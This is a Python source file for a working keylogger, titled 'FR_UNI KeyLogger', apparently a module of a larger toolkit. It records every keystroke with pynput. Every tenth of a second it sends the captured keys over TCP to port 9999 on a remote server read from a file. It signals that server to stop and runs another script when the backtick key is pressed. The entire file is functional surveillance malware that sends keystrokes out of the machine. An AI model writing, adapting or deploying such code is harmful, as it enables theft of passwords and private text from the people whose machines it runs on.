import os
from pynput import keyboard
from datetime import datetime
import time
import pyfiglet
from colorama import Fore, Style
import socket
import sys
import subprocess

# Ensure the Errors module can be imported
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..'))

text = pyfiglet.figlet_format("FR_UNI KeyLogger")
print(Fore.BLUE + text)

keys_pressed = []
timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

def get_error_message(error_code):
    error_messages = {
        "004": "\033[31m [Error code: 004] Failed to connect to the server.\033[0m",
        # Add more error codes and messages as needed
    }
    return error_messages.get(error_code, "Unknown error code.")

def keyPressed(key):
    global keys_pressed
    print(str(key))
    try:
        char = key.char
        keys_pressed.append(char)
        if key.char == '`':
            cleanup()
            return False  # Stop the listener
    except AttributeError:
        key_str = str(key).replace("Key.", "")
        keys_pressed.append(f"{{{key_str}}}")

def send_log_to_server(log_data):
    try:
        with open(os.path.join(os.path.dirname(__file__), 'server_ip.txt'), 'r') as f:
            server_ip = f.read().strip()
        server_port = 9999
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((server_ip, server_port))
            s.sendall(log_data.encode('utf-8'))
    except ConnectionRefusedError:
        print(get_error_message("004"))
    except FileNotFoundError:
        print("Server IP file not found.")

def write_log():
    global keys_pressed
    if keys_pressed:
        log_data = f"{timestamp} - {''.join(keys_pressed)}\n"
        send_log_to_server(log_data)
        keys_pressed = []

def send_stop_signal():
    try:
        with open(os.path.join(os.path.dirname(__file__), 'server_ip.txt'), 'r') as f:
            server_ip = f.read().strip()
        stop_signal_port = 9998
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((server_ip, stop_signal_port))
            s.sendall(b'STOP')
    except Exception as e:
        print(f"Failed to send stop signal: {e}")

def cleanup():
    send_log_to_server("\n\n")
    print("KeyLogger stopped.")
    send_stop_signal()
    # Run UNI.py after stopping the keylogger
    print(Fore.YELLOW + "Running UNI.py..." + Style.RESET_ALL)
    time.sleep(3)
    subprocess.run([sys.executable, os.path.join(os.path.dirname(__file__), '..', '..', 'UNI.py')])

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    try:
        while listener.running:
            write_log()
            time.sleep(0.1)  # Write log every 0.1 seconds
    except KeyboardInterrupt:
        cleanup()
